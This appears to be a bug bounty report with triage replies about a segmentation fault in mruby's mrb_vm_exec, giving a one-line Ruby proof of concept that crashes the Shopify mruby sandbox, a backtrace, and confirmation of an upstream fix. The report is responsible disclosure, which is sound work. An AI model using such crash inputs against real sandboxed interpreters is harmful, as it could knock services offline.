title: SIGSEGV in mrb_vm_exec
vulnerability_information:
PoC:
-------------------

The following code triggers the bug (attached as test_mrb_vm_exec_1296.rb):
	
	0.instance_eval{super()}

Sandbox:
-------------------

	x@x:~/Desktop/research/mruby-engine/bin$ ./sandbox test_mrb_vm_exec_1296.rb 
	./sandbox:20: [BUG] Segmentation fault at 0x00000000000028
	ruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]

	-- Control frame information -----------------------------------------------
	c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval
	c:0002 p:0186 s:0005 E:001a28 EVAL   ./sandbox:20 [FINISH]
	c:0001 p:0000 s:0002 E:000ff0 TOP    [FINISH]

	-- Ruby level backtrace information ----------------------------------------

	./sandbox:20:in `sandbox_eval'

	 RAX: 0x0000000000000000 RBX: 0x0000000000000000 RCX: 0x0000000000000001
	 RDX: 0x000000000000004f RDI: 0x00007f67746644e0 RSI: 0x00007f6774662cb0

	 R14: 0x00007f6774676f80 R15: 0x00007f67746644e0 EFL: 0x0000000000010202

	/lib/x86_64-linux-gnu/libc.so.6 [0x7f6779cbcff0]
	/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x1f37) [0x7f6775adcd27] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1296
	/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x5c) [0x7f6775ae184c] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772

activities.message:
Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Due to the holiday period and the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!
activities.markdown_message:
Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Due to the holiday period and the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!

activities.message: Thank you for your report. We've reproduced the crash, and opened an issue upstream: https://github.com/mruby/mruby/issues/3389
activities.markdown_message: Thank you for your report. We've reproduced the crash, and opened an issue upstream: https://github.com/mruby/mruby/issues/3389

activities.message:
Hi @ston3, thanks again for reporting this issue. I confirmed the issue was fixed by this commit: https://github.com/mruby/mruby/commit/06b2e6a76c562b7a83669d0ffe7e4ac43a2636db. Now that this is fixed upstream, I'll close this report as Resolved.

For your information, we usually do payouts on a 2 week schedule, so our next round should be around January 23rd.
activities.markdown_message:
Hi @ston3, thanks again for reporting this issue. I confirmed the issue was fixed by this commit: https://github.com/mruby/mruby/commit/06b2e6a76c562b7a83669d0ffe7e4ac43a2636db. Now that this is fixed upstream, I'll close this report as Resolved.

For your information, we usually do payouts on a 2 week schedule, so our next round should be around January 23rd.

activities.message: Thank you for your interest. No Problem.
activities.markdown_message: Thank you for your interest. No Problem.

activities.message: Thanks for helping improve the security of Shopify and the Mruby project!
